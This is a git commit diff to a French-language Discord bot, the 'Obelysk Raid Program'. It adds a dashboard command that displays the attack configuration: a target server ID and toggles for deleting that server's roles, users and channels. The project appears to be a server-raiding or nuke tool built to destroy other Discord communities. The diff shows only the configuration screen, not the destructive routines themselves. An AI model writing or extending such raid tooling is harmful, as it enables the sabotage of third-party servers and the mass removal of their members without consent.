52c2039a9046ab7b42cfb64ff7c6c8e1c1ff2747
Spyraling France <113287870+aleisker@users.noreply.github.com>
2023-10-10 07:23:25 +0200

    Update dashboard.ts

--- source/commands/configuration/dashboard.ts
+++ source/commands/configuration/dashboard.ts
@@ -1,4 +1,4 @@
-import { PermissionsBitField, SlashCommandBuilder } from 'discord.js';
+import { EmbedBuilder, PermissionsBitField, SlashCommandBuilder } from 'discord.js';
 import ApplicationManager from '../../cluster/applicationmanager';
 import { Command } from '../../interfaces/command';
 
@@ -10,7 +10,24 @@ const dashboard: Command = {
 		.setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
 	async executeCommand(client, interaction) {
 		let applicationDbInstance = await ApplicationManager.findOne({ applicationID: client.user?.id });
-		if(!applicationDbInstance) { applicationDbInstance = await client.getDatabase().createApplicationDatabase(); }
+		if(!applicationDbInstance) {
+			client.getLogger().send(`Tentative de création de la base de données d'application N°DBAPP_NO:${client.user?.id}...`, "ALERT");
+			await client.getDatabase().createApplicationDatabase(client.user!.id);
+		} else {
+			let dashboardEmbedBuilder = new EmbedBuilder()
+				.setAuthor({ iconURL: client.user?.avatarURL()!, name: "Obelysk Raid Program"})
+				.setTitle("Configuration de l'attaque")
+				.setDescription("**Commandes utiles :** \n/delete-roles <true | false> : Active|Désactive la suppréssion des Rôles.\n/delete-users <true | false> : Active|Désactive la suppréssion des Users.\n/delete-channels <true | false> : Active|Désactive la suppréssion des Channels.")
+				.addFields([
+					{ name: "Serveur à attaquer", value: applicationDbInstance.serverTargetId, inline: false },
+					{ name: "Supprimer les Rôles ?", value: `Choix : ${applicationDbInstance.deleteRoles}`, inline: false },
+					{ name: "Supprimer les Users ?", value: `Choix : ${applicationDbInstance.deleteUsers}`, inline: false },
+					{ name: "Supprimer les Channels ?", value: `Choix : ${applicationDbInstance.deleteChannels}`, inline: false },
+				])
+				.setColor(client.getConfig().embed.classColor)
+				.setFooter({ text: client.getConfig().embed.footer, iconURL: interaction.user.avatarURL()! })
+			interaction.reply({ embeds: [ dashboardEmbedBuilder], ephemeral: false }).catch(e => client.getLogger().send(`Erreur : ${e}`, "ERROR"));
+		}
 	},
 
 	settings: {
